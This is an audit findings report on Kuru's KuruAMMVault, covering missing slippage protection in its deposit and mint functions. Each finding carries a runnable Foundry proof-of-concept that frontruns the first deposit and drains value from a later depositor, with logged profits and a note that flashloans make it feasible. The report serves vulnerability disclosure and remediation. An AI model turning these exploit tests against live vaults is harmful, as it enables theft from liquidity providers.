# Kuru - Findings Report

## Table of Contents
- High Risk Findings
    - [H-01. Lack of Slippage Protection in Deposit Logic allows to drain value](#H-01)
- Medium Risk Findings
    - [M-01. Lack of Slippage Protection in Mint logic](#M-01)

---

## Contest Summary

**Sponsor:** Kuru

**Dates:** TBD

---

## Results Summary

| Severity | Count |
|----------|-------|
| High     | 1     |
| Medium   | 1     |
| Low      | 0     |

---

# High Risk Findings

## <a id='H-01'></a>H-01. Lack of Slippage Protection in Deposit Logic allows to drain value

### Summary

The deposit logic within the KuruAMMVault does not allow slippage protection, which allows anyone to frontrun the initial deposit, setting an arbitrary price and extracting disproportional value.

### Finding Description

Looking in the deposit function within KuruAMMVault:

```solidity
function deposit(
@>      uint256 baseDeposit,
@>      uint256 quoteDeposit,
@>      address receiver
    ) public payable nonReentrant returns (uint256) {
        require(
            (token1 == address(0) || token2 == address(0))
                ? msg.value >=
                    (token1 == address(0) ? baseDeposit : quoteDeposit)
                : msg.value == 0,
            KuruAMMVaultErrors.NativeAssetMismatch()
        );

        return _mintAndDeposit(baseDeposit, quoteDeposit, receiver);
    }
```

We can clearly see that a user is able to specify 3 parameters, baseDeposit, quoteDeposit and receiver, however, not a minimum amount of shares to receive, or a price. While one might think that the function would calculate an acceptable price from the relationship between baseDeposit and quoteDeposit provided by the user, this is not the case. Furthermore, the contract is designed to be used by EOAs which lack the ability to perform slippage checks by themselves.

Considering above, it is easily possible for anyone to frontrun the initial deposit with an entirely skewed price and backrun it afterwards with a buy or sell order, to extract a massive amount of value from the victim as shown in the PoC below.

### Impact Explanation

Extracting a large amount of value of the victim is basically direct theft of funds, the impact is high.

### Likelihood Explanation

The attack is highly profitable and therefore the likelihood is high.

### Proof of Concept

Copy and paste the following code into a new file in ./test/PoC.t.sol and run it using `forge test --mt test_liquidityFrontrun -vv`:

```solidity
//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {FixedPointMathLib} from "../contracts/libraries/FixedPointMathLib.sol";
import {OrderBookErrors, KuruAMMVaultErrors, MarginAccountErrors} from "../contracts/libraries/Errors.sol";
import {IOrderBook} from "../contracts/interfaces/IOrderBook.sol";
import {KuruAMMVault} from "../contracts/KuruAMMVault.sol";
import {OrderBook} from "../contracts/OrderBook.sol";
import {KuruForwarder} from "../contracts/KuruForwarder.sol";
import {MarginAccount} from "../contracts/MarginAccount.sol";
import {Router} from "../contracts/Router.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {MintableERC20} from "./lib/MintableERC20.sol";

contract POC is Test {
    // These are all configurable parameters
    uint96 constant SIZE_PRECISION = 10 ** 10;
    uint32 constant PRICE_PRECISION = 10 ** 4;
    uint32 constant TICK_SIZE = 10 ** 2;
    uint96 constant MIN_SIZE = 10 ** 8;
    uint96 constant MAX_SIZE = 10 ** 14;
    uint256 constant TAKER_FEE_BPS = 0;
    uint256 constant MAKER_FEE_BPS = 0;
    uint96 constant VAULT_SPREAD = 30;

    address BASE_TOKEN;
    address QUOTE_TOKEN;
    Router router;
    MarginAccount marginAccount;
    KuruForwarder kuruForwarder;
    OrderBook orderBook;
    KuruAMMVault kuruAmmVault;

    address FEE_COLLECTOR = makeAddr("FEE_COLLECTOR");

    function setUp() public {
        // Configure the market type as you need
        OrderBook.OrderBookType _type = IOrderBook.OrderBookType.NO_NATIVE;
        if (uint8(_type) == 0) {
            // NO_NATIVE
            MintableERC20 baseToken = new MintableERC20("BASE Token", "BASE");
            MintableERC20 quoteToken = new MintableERC20(
                "QUOTE Token",
                "QUOTE"
            );
            BASE_TOKEN = address(baseToken);
            QUOTE_TOKEN = address(quoteToken);
        } else if (uint8(_type) == 1) {
            // NATIVE_IN_BASE
            BASE_TOKEN = address(0);
            MintableERC20 quoteToken = new MintableERC20(
                "QUOTE Token",
                "QUOTE"
            );
            QUOTE_TOKEN = address(quoteToken);
        } else if (uint8(_type) == 2) {
            // NATIVE_IN_QUOTE
            MintableERC20 baseToken = new MintableERC20("BASE Token", "BASE");
            BASE_TOKEN = address(baseToken);
            QUOTE_TOKEN = address(0);
        }

        Router routerImplementation = new Router();
        MarginAccount marginAccountImplementation = new MarginAccount();
        OrderBook orderBookImplementation = new OrderBook();
        KuruAMMVault kuruAmmVaultImplementation = new KuruAMMVault();
        KuruForwarder kuruForwarderImplementation = new KuruForwarder();
        router = Router(
            payable(new ERC1967Proxy(address(routerImplementation), ""))
        );
        kuruForwarder = KuruForwarder(
            (
                address(
                    new ERC1967Proxy(address(kuruForwarderImplementation), "")
                )
            )
        );
        marginAccount = MarginAccount(
            payable(new ERC1967Proxy(address(marginAccountImplementation), ""))
        );
        bytes4[] memory allowedInterfaces = new bytes4[](6);
        allowedInterfaces[0] = OrderBook.addBuyOrder.selector;
        allowedInterfaces[1] = OrderBook.addSellOrder.selector;
        allowedInterfaces[2] = OrderBook.placeAndExecuteMarketBuy.selector;
        allowedInterfaces[3] = OrderBook.placeAndExecuteMarketSell.selector;
        allowedInterfaces[4] = MarginAccount.deposit.selector;
        kuruForwarder.initialize(address(this), allowedInterfaces);
        marginAccount.initialize(
            address(this),
            address(router),
            FEE_COLLECTOR,
            address(kuruForwarder)
        );
        router.initialize(
            address(this),
            address(marginAccount),
            address(orderBookImplementation),
            address(kuruAmmVaultImplementation),
            address(kuruForwarder)
        );
        orderBook = OrderBook(
            router.deployProxy(
                IOrderBook.OrderBookType.NO_NATIVE,
                BASE_TOKEN,
                QUOTE_TOKEN,
                SIZE_PRECISION,
                PRICE_PRECISION,
                TICK_SIZE,
                MIN_SIZE,
                MAX_SIZE,
                TAKER_FEE_BPS,
                MAKER_FEE_BPS,
                VAULT_SPREAD
            )
        );
        kuruAmmVault = KuruAMMVault(
            payable(
                router.computeVaultAddress(
                    address(orderBook),
                    address(0),
                    false
                )
            )
        );
    }

    function test_liquidityFrontrun() public {
        MintableERC20 baseToken;
        MintableERC20 quoteToken;
        address alice;
        address bob;

        (baseToken, quoteToken, alice, bob) = _makeUsers();

        address vault = router.computeVaultAddress(
            address(orderBook),
            address(0),
            false
        );
        kuruAmmVault = KuruAMMVault(payable(vault));
        vm.startPrank(bob);
        kuruAmmVault.deposit(1010, 1001, bob);
        vm.stopPrank();
        vm.startPrank(alice);
        kuruAmmVault.deposit(1000e18, 5000000e18, alice);
        vm.stopPrank();
        vm.startPrank(bob);
        marginAccount.deposit(bob, address(QUOTE_TOKEN), 110e21);
        uint32 price = 3000 * PRICE_PRECISION;
        orderBook.addBuyOrder(price, 1000 * SIZE_PRECISION, false);

        uint256 bestPrice = orderBook.vaultBestAsk();
        console.log(bestPrice);
        address[] memory addr = new address[](2);
        addr[0] = BASE_TOKEN;
        addr[1] = QUOTE_TOKEN;
        marginAccount.batchWithdrawMaxTokens(addr);
        vm.stopPrank();
        console.log(baseToken.balanceOf(bob));
        console.log(quoteToken.balanceOf(bob));
    }



    function _makeUsers()
        public
        returns (
            MintableERC20 baseToken,
            MintableERC20 quoteToken,
            address alice,
            address bob
        )
    {
        baseToken = MintableERC20(BASE_TOKEN);
        quoteToken = MintableERC20(QUOTE_TOKEN);

        alice = makeAddr("alice");
        bob = makeAddr("bob");
        baseToken.mint(alice, 100000000e18);
        quoteToken.mint(alice, 100000000e18);
        baseToken.mint(bob, 1010);
        quoteToken.mint(bob, 110e21 + 1001);

        vm.startPrank(alice);
        baseToken.approve(address(kuruAmmVault), type(uint256).max);
        quoteToken.approve(address(kuruAmmVault), type(uint256).max);
        baseToken.approve(address(marginAccount), type(uint256).max);
        quoteToken.approve(address(marginAccount), type(uint256).max);
        vm.stopPrank();
        
        vm.startPrank(bob);
        baseToken.approve(address(kuruAmmVault), type(uint256).max);
        quoteToken.approve(address(kuruAmmVault), type(uint256).max);
        baseToken.approve(address(marginAccount), type(uint256).max);
        quoteToken.approve(address(marginAccount), type(uint256).max);
        vm.stopPrank();
    }
}
```

Which will produce the following log:

```
Ran 1 test for test/PoC.t.sol:POC
[PASS] test_liquidityFrontrun() (gas: 13452830)
Logs:
  3001991556068042385127
  981884525091800000000
  2262398900000000000000
```

As you can see in the PoC file above, we initially started Bob with a Base Token balance of 1010 and Quote Token balance of ~110e21.

Assuming a pool like WETH:USDC and Alice Deposit is the real value of 1:5000 WETH:USDC we can quickly calculate that in above scenario Bob was able to buy ~981 WETH for a little less than his initial 110k USDC, netting a profit of roughly 450k USDC, within a single transaction, so beside Gas, Bob could execute said scenario without own capital but with a flashloan.

### Recommendation

Let the user specify a minimum amount of shares and/or a minimum acceptable price upon depositing liquidity.

---

# Medium Risk Findings

## <a id='M-01'></a>M-01. Lack of Slippage Protection in Mint logic

### Summary

Lack of slippage protection when minting liquidity can cause users being sandwiched, if the wallet integration is aggressively asking approvals.

### Finding Description

Consider the following function within KuruAMMVault:

```solidity
function mint(
        uint256 shares,
        address receiver
    ) public payable returns (uint256, uint256) {
        // @audit this function does not check if the right amount of shares is minted
        (uint256 baseDeposit, uint256 quoteDeposit) = previewMint(shares);

        deposit(baseDeposit, quoteDeposit, receiver);

        return (baseDeposit, quoteDeposit);
    }
```

As you can see the function takes the amount of shares the user wants to mint, and the receiver, however lacks a slippage protection in case prices drastically change, especially during first deposit. This can cause an unexpected ratio to be pulled into the contract, potentially harming the user.

### Impact Explanation

The impact overall is low to medium, since the amount of shares is fixed. Manipulating the price so the user can lose a substantial amount is only possible in edge cases, in the first deposit and lastly requires the frontend integration to ask for max approval. However, this behaviour is not uncommon, and since the contract is supposed to work with EOA interactions, a slippage protection on contract level for the mint function should be integrated.

### Likelihood Explanation

Likelihood is low to medium as well, since it requires the frontend to collect max approval for both tokens for this issue to carry a significant impact.

### Proof of Concept

Copy and paste the following code into a new file in ./test/PoC.t.sol and run it using `forge test --mt test_liquidityFrontrun -vv`:

```solidity
//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {FixedPointMathLib} from "../contracts/libraries/FixedPointMathLib.sol";
import {OrderBookErrors, KuruAMMVaultErrors, MarginAccountErrors} from "../contracts/libraries/Errors.sol";
import {IOrderBook} from "../contracts/interfaces/IOrderBook.sol";
import {KuruAMMVault} from "../contracts/KuruAMMVault.sol";
import {OrderBook} from "../contracts/OrderBook.sol";
import {KuruForwarder} from "../contracts/KuruForwarder.sol";
import {MarginAccount} from "../contracts/MarginAccount.sol";
import {Router} from "../contracts/Router.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {MintableERC20} from "./lib/MintableERC20.sol";

contract POC is Test {
    // These are all configurable parameters
    uint96 constant SIZE_PRECISION = 10 ** 10;
    uint32 constant PRICE_PRECISION = 10 ** 4;
    uint32 constant TICK_SIZE = 10 ** 2;
    uint96 constant MIN_SIZE = 10 ** 8;
    uint96 constant MAX_SIZE = 10 ** 14;
    uint256 constant TAKER_FEE_BPS = 0;
    uint256 constant MAKER_FEE_BPS = 0;
    uint96 constant VAULT_SPREAD = 30;

    address BASE_TOKEN;
    address QUOTE_TOKEN;
    Router router;
    MarginAccount marginAccount;
    KuruForwarder kuruForwarder;
    OrderBook orderBook;
    KuruAMMVault kuruAmmVault;

    address FEE_COLLECTOR = makeAddr("FEE_COLLECTOR");

    function setUp() public {
        // Configure the market type as you need
        OrderBook.OrderBookType _type = IOrderBook.OrderBookType.NO_NATIVE;
        if (uint8(_type) == 0) {
            // NO_NATIVE
            MintableERC20 baseToken = new MintableERC20("BASE Token", "BASE");
            MintableERC20 quoteToken = new MintableERC20(
                "QUOTE Token",
                "QUOTE"
            );
            BASE_TOKEN = address(baseToken);
            QUOTE_TOKEN = address(quoteToken);
        } else if (uint8(_type) == 1) {
            // NATIVE_IN_BASE
            BASE_TOKEN = address(0);
            MintableERC20 quoteToken = new MintableERC20(
                "QUOTE Token",
                "QUOTE"
            );
            QUOTE_TOKEN = address(quoteToken);
        } else if (uint8(_type) == 2) {
            // NATIVE_IN_QUOTE
            MintableERC20 baseToken = new MintableERC20("BASE Token", "BASE");
            BASE_TOKEN = address(baseToken);
            QUOTE_TOKEN = address(0);
        }

        Router routerImplementation = new Router();
        MarginAccount marginAccountImplementation = new MarginAccount();
        OrderBook orderBookImplementation = new OrderBook();
        KuruAMMVault kuruAmmVaultImplementation = new KuruAMMVault();
        KuruForwarder kuruForwarderImplementation = new KuruForwarder();
        router = Router(
            payable(new ERC1967Proxy(address(routerImplementation), ""))
        );
        kuruForwarder = KuruForwarder(
            (
                address(
                    new ERC1967Proxy(address(kuruForwarderImplementation), "")
                )
            )
        );
        marginAccount = MarginAccount(
            payable(new ERC1967Proxy(address(marginAccountImplementation), ""))
        );
        bytes4[] memory allowedInterfaces = new bytes4[](6);
        allowedInterfaces[0] = OrderBook.addBuyOrder.selector;
        allowedInterfaces[1] = OrderBook.addSellOrder.selector;
        allowedInterfaces[2] = OrderBook.placeAndExecuteMarketBuy.selector;
        allowedInterfaces[3] = OrderBook.placeAndExecuteMarketSell.selector;
        allowedInterfaces[4] = MarginAccount.deposit.selector;
        kuruForwarder.initialize(address(this), allowedInterfaces);
        marginAccount.initialize(
            address(this),
            address(router),
            FEE_COLLECTOR,
            address(kuruForwarder)
        );
        router.initialize(
            address(this),
            address(marginAccount),
            address(orderBookImplementation),
            address(kuruAmmVaultImplementation),
            address(kuruForwarder)
        );
        orderBook = OrderBook(
            router.deployProxy(
                IOrderBook.OrderBookType.NO_NATIVE,
                BASE_TOKEN,
                QUOTE_TOKEN,
                SIZE_PRECISION,
                PRICE_PRECISION,
                TICK_SIZE,
                MIN_SIZE,
                MAX_SIZE,
                TAKER_FEE_BPS,
                MAKER_FEE_BPS,
                VAULT_SPREAD
            )
        );
        kuruAmmVault = KuruAMMVault(
            payable(
                router.computeVaultAddress(
                    address(orderBook),
                    address(0),
                    false
                )
            )
        );
    }

    function test_liquidityFrontrun() public {
        MintableERC20 baseToken;
        MintableERC20 quoteToken;
        address alice;
        address bob;

        (baseToken, quoteToken, alice, bob) = _makeUsers();

        address vault = router.computeVaultAddress(
            address(orderBook),
            address(0),
            false
        );
        kuruAmmVault = KuruAMMVault(payable(vault));
        vm.startPrank(bob);
        kuruAmmVault.deposit(1010, 1001, bob);
        vm.stopPrank();
        vm.startPrank(alice);
        kuruAmmVault.mint(1000e18, alice); // Alice expects a price of round about 1:5000, however Bob initialized on 10:1
        // since alice wallet asked max approval a lot of her value will get drained by bob.
        vm.stopPrank();
        vm.startPrank(bob);
        marginAccount.deposit(bob, address(QUOTE_TOKEN), 110e21);
        uint32 price = 3000 * PRICE_PRECISION;
        orderBook.addBuyOrder(price, 1000 * SIZE_PRECISION, false);

        uint256 bestPrice = orderBook.vaultBestAsk();
        console.log(bestPrice);
        address[] memory addr = new address[](2);
        addr[0] = BASE_TOKEN;
        addr[1] = QUOTE_TOKEN;
        marginAccount.batchWithdrawMaxTokens(addr);
        vm.stopPrank();
        console.log(baseToken.balanceOf(bob));
        console.log(quoteToken.balanceOf(bob));
    }

    function _makeUsers()
        public
        returns (
            MintableERC20 baseToken,
            MintableERC20 quoteToken,
            address alice,
            address bob
        )
    {
        baseToken = MintableERC20(BASE_TOKEN);
        quoteToken = MintableERC20(QUOTE_TOKEN);

        alice = makeAddr("alice");
        bob = makeAddr("bob");
        baseToken.mint(alice, 100000000e18);
        quoteToken.mint(alice, 100000000e18);
        baseToken.mint(bob, 1010);
        quoteToken.mint(bob, 110e21 + 1001);

        vm.startPrank(alice);
        baseToken.approve(address(kuruAmmVault), type(uint256).max);
        quoteToken.approve(address(kuruAmmVault), type(uint256).max);
        baseToken.approve(address(marginAccount), type(uint256).max);
        quoteToken.approve(address(marginAccount), type(uint256).max);
        vm.stopPrank();

        vm.startPrank(bob);
        baseToken.approve(address(kuruAmmVault), type(uint256).max);
        quoteToken.approve(address(kuruAmmVault), type(uint256).max);
        baseToken.approve(address(marginAccount), type(uint256).max);
        quoteToken.approve(address(marginAccount), type(uint256).max);
        vm.stopPrank();
    }
}
```

Looking at the logs we can clearly see that Bob was able to extract a majority from Alices value, simply because of the "questionable" but common wallet integration.

### Recommendation

Implement a slippage parameter which will be checked, or document this behaviour within the natspec.